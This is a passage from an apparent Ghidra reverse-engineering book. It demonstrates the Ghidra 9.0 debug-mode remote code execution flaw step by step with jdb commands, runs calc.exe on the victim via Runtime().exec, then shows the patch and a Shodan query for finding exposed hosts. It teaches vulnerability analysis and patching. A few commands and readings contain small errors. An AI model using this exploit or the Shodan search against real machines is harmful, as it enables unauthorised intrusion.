			<pre>-Xrunjdwp:transport=dt_socket,server=y,suspend=!SUSPEND!,address=!DEBUG_ADDRESS!</pre>&#13;
			<p>As you can see, the <a id="_idIndexMarker112"/>vulnerability is so evident that, paradoxically, it is likely that it went unnoticed for the same reason.</p>&#13;
			<h2 id="_idParaDest-48"><a id="_idTextAnchor056"/>Exploiting the Ghidra RCE vulnerability</h2>&#13;
			<p>To <a id="_idIndexMarker113"/>exploit this RCE vulnerability, we set up a vulnerable machine by executing Ghidra 9.0 in debug mode. This can be done by executing the <code>ghidraDebug.bat</code> file:</p>&#13;
			<pre>C:\Users\virusito\Desktop\ghidra_9.0_PUBLIC\support&gt;ghidraDebug.bata</pre>&#13;
			<pre>Listening for transport dt_socket at address: 18001</pre>&#13;
			<p>Then, we <a id="_idIndexMarker114"/>retrieve the <code>3828</code>, as shown in the following listing:</p>&#13;
			<pre>C:\Users\virusito&gt;tasklist /fi "IMAGENAME eq java.exe" /FO LIST | FIND "PID:"</pre>&#13;
			<pre>PID:    3828</pre>&#13;
			<p>Then, we list the active connections associated with it using <code>netstat</code>:</p>&#13;
			<pre>C:\Users\virusito&gt;netstat -ano | FINDSTR 3828</pre>&#13;
			<pre>  TCP    127.0.0.1:18001    0.0.0.0:0    LISTENING    3828</pre>&#13;
			<p>As you can see in the previous listing, a listening connection is opened to the world as indicated with <code>0.0.0.0:0</code>. Then, we can establish a connection to it from anywhere. Use the following code, replacing <code>VICTIM_IP_HERE</code> with the victim's IP address:</p>&#13;
			<pre>C:\Users\virusito&gt;jdb -connect com.sun.jdi.SocketAttach:port=18001,hostname=VICTIM_IP_HERE</pre>&#13;
			<pre>Set deferred uncaught java.lang.Throwable</pre>&#13;
			<pre>Initializing jdb ...</pre>&#13;
			<pre>&gt;</pre>&#13;
			<p>Then, look for a runnable class that will probably soon hit a breakpoint if established:</p>&#13;
			<pre>&gt;classes</pre>&#13;
			<pre>...</pre>&#13;
			<pre>javax.swing.RepaintManager$DisplayChangedHandler</pre>&#13;
			<pre>javax.swing.RepaintManager$PaintManager</pre>&#13;
			<pre>javax.swing.RepaintManager$ProcessingRunnable</pre>&#13;
			<pre>javax.swing.RootPaneContainer</pre>&#13;
			<pre>javax.swing.ScrollPaneConstants</pre>&#13;
			<pre>...</pre>&#13;
			<p><code>javax.swing.RepaintManager$ProcessingRunnable</code> will be hit when repainting the window. It is a pretty good candidate. Let's add a breakpoint to it by using the <code>stop</code> command: </p>&#13;
			<pre>&gt; stop in javax.swing.RepaintManager$ProcessingRunnable.run()</pre>&#13;
			<pre>Set breakpoint javax.swing.RepaintManager$ProcessingRunnable.run()</pre>&#13;
			<p>Then, the <a id="_idIndexMarker115"/>breakpoint is quickly hit:</p>&#13;
			<pre>Breakpoint hit: "thread=AWT-EventQueue-0", javax.swing.RepaintManager$ProcessingRunnable.run(), line=1.871 bci=0</pre>&#13;
			<p>Given this situation, you can execute any arbitrary command. I will execute a calculator via <code>calc.exe</code>, but you can replace it with any command injection payload:</p>&#13;
			<pre>AWT-EventQueue-0[1] print new java.lang.Runtime().exec("calc.exe")</pre>&#13;
			<pre>new java.lang.Runtime().exec("calc.exe") = "Process[pid=9268, exitValue="not exited"]"</pre>&#13;
			<p>In this case, the Windows calculator program was executed on the hacked computer. We know the attack was successful because we obtained feedback indicating that a new process identified by PID <code>9268</code> was created on the victim's machine.</p>&#13;
			<h2 id="_idParaDest-49"><a id="_idTextAnchor057"/>Fixing the Ghidra RCE vulnerability</h2>&#13;
			<p>To fix the <a id="_idIndexMarker116"/>vulnerability, the <code>DEBUG_ADDRESS</code> variable is set to <code>127.0.0.1:18001</code>, which restricts the incoming debugging connections to <code>localhost</code>:</p>&#13;
			<pre>if "%DEBUG%"=="y" (</pre>&#13;
			<pre>    if "%DEBUG_ADDRESS%"=="" (</pre>&#13;
			<pre>        set DEBUG_ADDRESS=127.0.0.1:18001</pre>&#13;
			<pre>    )</pre>&#13;
			<p>Manually reviewing these lines allows you to check on your own whether a given Ghidra version is vulnerable to this attack.</p>&#13;
			<h2 id="_idParaDest-50"><a id="_idTextAnchor058"/>Looking for vulnerable computers</h2>&#13;
			<p>The Ghidra RCE vulnerability was a small but extremely important mistake because vulnerable <a id="_idIndexMarker117"/>computers can be located in a straightforward way; for example, by querying Shodan (you will need a Shodan account and must be logged in; otherwise, the results of this link will be not available for you): <a href="https://www.shodan.io/search?query=port:18001">https://www.shodan.io/search?query=port:18001</a>.</p>&#13;
			<p>As you know, this <a id="_idIndexMarker118"/>vulnerability is probably not an <strong class="bold">National Security Agency</strong> (<strong class="bold">NSA</strong>) backdoor into the program. The NSA has its own zero-day exploits to hack computers and, for sure, doesn't need to introduce backdoors into its own programs to hack the computers of people around the world. In fact, to do so would be a terrible move in terms of reputation. </p>&#13;
			<p class="callout-heading">Important note</p>&#13;
			<p class="callout">Be sure you're using a patched version of Ghidra when using debug mode, as using a vulnerable version of Ghidra poses a high risk of being hacked.</p>&#13;
			<h1 id="_idParaDest-51"><a id="_idTextAnchor059"/>Summary</h1>&#13;
			<p>In this chapter, you learned how to synchronize Eclipse and Ghidra for development and debugging purposes using the GhidraDev plugin. You learned skills not only for debugging scripts but also for debugging any Ghidra source code line, allowing you to explore the internals of this awesome framework on your own.</p>&#13;
			<p>We also learned how the Ghidra RCE vulnerability works, how to patch it, how to exploit it, and why it is probably not an NSA backdoor. In the next chapter, we will cover Ghidra extensions that are used to freely extend Ghidra from the source code. </p>&#13;
			<h1 id="_idParaDest-52"><a id="_idTextAnchor060"/>Questions</h1>&#13;
			<ol>&#13;
				<li value="1">Is it possible to debug a compiled version of Ghidra using the source code instead of bytecode?</li>&#13;
				<li>Is it possible to debug Ghidra using an IDE other than Eclipse? Are other IDEs supported?</li>&#13;
				<li>Does it seem likely to you that the NSA is spying on Ghidra users? Do you think this likely includes backdoors?</li>&#13;
			</ol>&#13;
			<h1 id="_idParaDest-53"><a id="_idTextAnchor061"/>Further reading</h1>&#13;
			<p>You can refer to the following links for more information on the topics covered in this chapter:</p>&#13;
			<ul>&#13;
				<li><em class="italic">Introduction to JVM Languages</em>, <em class="italic">Vincent van der Leun</em>, June 2017:<a href="https://subscription.packtpub.com/book/application_development/9781787127944">https://subscription.packtpub.com/book/application_development/9781787127944</a></li>&#13;
				<li>Ghidra Dev without Eclipse: <a href="https://reversing.technology/2019/11/18/ghidra-dev-pt1.html">https://reversing.technology/2019/11/18/ghidra-dev-pt1.html</a> </li>&#13;
				<li><em class="italic">The Complete Metasploit Guide</em>, <em class="italic">Sagar Rahalkar and Nipun Jaswal</em>, June 2019: <a href="https://subscription.packtpub.com/book/security/9781838822477">https://subscription.packtpub.com/book/security/9781838822477</a></li>&#13;
			</ul>&#13;
		</div>&#13;
	</div></body></html>